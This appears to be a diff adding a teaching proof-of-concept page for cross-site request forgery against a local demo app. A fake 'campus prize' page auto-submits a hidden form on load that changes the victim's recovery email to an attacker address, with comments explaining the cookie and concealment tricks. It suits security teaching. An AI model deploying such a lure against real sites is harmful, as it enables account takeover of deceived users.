@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎉 You won a campus prize!</title>
+    <style>
+      body { font-family: system-ui, sans-serif; max-width: 640px; margin: 4rem auto; padding: 0 1rem; }
+      .card { border: 1px solid #e5e7eb; border-radius: 12px; padding: 2rem; text-align: center; }
+      h1 { font-size: 1.6rem; }
+      button { padding: .6rem 1.2rem; font-size: 1rem; border-radius: 8px; border: 0; background: #4f46e5; color: #fff; cursor: pointer; }
+      .fine { color: #6b7280; font-size: .8rem; margin-top: 2rem; }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>🎉 Congratulations! You won a campus prize 🎉</h1>
+      <p>Click below to claim your free coffee voucher.</p>
+      <button onclick="document.getElementById('claim').textContent='Loading…'">Claim my prize</button>
+      <p id="claim"></p>
+    </div>
+
+    <!--
+      The real payload: an auto-submitting form that POSTs to the Lost & Found API.
+      The victim's browser attaches their auth cookie automatically (the app and
+      this page are both on "localhost", so SameSite=Lax still sends it), and the
+      vulnerable server trusts that cookie with no anti-CSRF check. The response
+      lands in a hidden iframe, so the victim never notices anything happened.
+    -->
+    <iframe name="sink" style="display:none"></iframe>
+    <form
+      id="forge"
+      action="http://localhost:4000/api/settings/recovery-email"
+      method="POST"
+      target="sink"
+    >
+      <input type="hidden" name="recoveryEmail" value="attacker@evil.com" />
+    </form>
+
+    <script>
+      // Fire the forged request as soon as the page loads.
+      document.getElementById('forge').submit();
+    </script>
+
+    <p class="fine">Nothing to see here. (Open DevTools → Network to watch the forged request.)</p>
+  </body>
+</html>
